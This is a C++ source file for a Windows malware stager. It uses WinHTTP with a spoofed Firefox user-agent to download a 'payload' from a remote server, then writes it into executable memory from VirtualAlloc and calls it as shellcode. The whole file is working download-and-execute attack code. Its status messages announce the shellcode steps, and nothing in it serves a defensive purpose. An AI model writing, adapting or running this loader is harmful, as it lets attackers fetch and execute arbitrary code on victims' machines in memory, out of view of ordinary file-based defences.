#include "utils.h"

/*
* Initiate an HTTP Connection to a Server
*/
BOOL initHttpConn(LPCWSTR hostName, int portNum, LPCWSTR httpAction, LPCWSTR httpUrl, HINTERNET& hSess, HINTERNET& hConn, HINTERNET& hReq) {

	BOOL bRes = FALSE;

	//https://learn.microsoft.com/fr-fr/windows/win32/api/winhttp/nf-winhttp-winhttpopen
	hSess = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
		WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
	if (hSess)
		hConn = WinHttpConnect(hSess, hostName, portNum, 0);
	else
		printf("[!] Unable to connect to WebServer!\n");

	//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest
	hReq = WinHttpOpenRequest(hConn, httpAction, httpUrl, 0, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

	//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
	bRes = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

	if (bRes)
		bRes = WinHttpReceiveResponse(hReq, NULL);
	else
		return false;

	return bRes;
}


/*
* Release Ressources
*/
void releaseHandles(HINTERNET& hSess, HINTERNET& hConn, HINTERNET& hReq) {

	if (hReq) WinHttpCloseHandle(hReq);
	if (hConn) WinHttpCloseHandle(hConn);
	if (hSess) WinHttpCloseHandle(hSess);
}


/*
* Retrieve the Payload
*/
vector<char> downloadPayload(HINTERNET hReq) {

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	vector<char> buffer;

	if (!WinHttpQueryDataAvailable(hReq, &dwSize)) {
		printf("[!] Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
		return vector<char>();
	}
	else {
		while (dwSize > 0) {

			buffer.resize(dwSize);
			ZeroMemory(&buffer[0], dwSize);

			//https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreaddata
			if (!WinHttpReadData(hReq, (LPVOID)&buffer[0], dwSize, &dwDownloaded)) {
				printf("[!] Error %u in WinHttpReadData.\n", GetLastError());
				return vector<char>();
			}
			else
				dwSize = 0;
		}
	}

	return buffer;
}


/*
* Execute the downloaded Payload in memory
*/
void executePayload(vector<char> buffer) {

	void* exec = VirtualAlloc(0, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[+] Allocated memory for shellcode: %p\n", exec);

	memcpy(exec, &buffer[0], buffer.size());
	printf("[+] Moved shellcode into allocated memory space: %p\n", exec);

	((void(*)())exec)();

	buffer.clear();
}


